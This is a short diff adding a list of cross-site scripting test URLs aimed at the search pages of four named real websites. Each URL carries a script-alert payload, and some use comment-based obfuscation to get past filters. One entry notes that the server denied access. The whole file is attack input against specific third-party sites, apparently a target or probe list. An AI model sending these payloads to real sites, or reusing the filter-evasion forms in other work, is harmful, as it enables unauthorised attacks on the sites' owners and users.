@@ -1,0 +1,5 @@
+1.http://www.opentelemac.org/index.php/search?q=<script>alert(1);</script> 	#You don't have permission to access /index.php/search on this server.
+2.http://www.cheapesthobby.com/site/search.php?searchString=<script>alert('XSS');</script>
+3.http://www.thebankcodes.com/hongkong_banks/bank_results.php?searchstring=</*!50000script*/>/*!50000alert*/(1);<//*!50000script*/>
+4.http://www.kinglibrary.ca/siteSearch.php?searchstring=</*!50000script*/>alert(1);<//*!50000script*/>
+
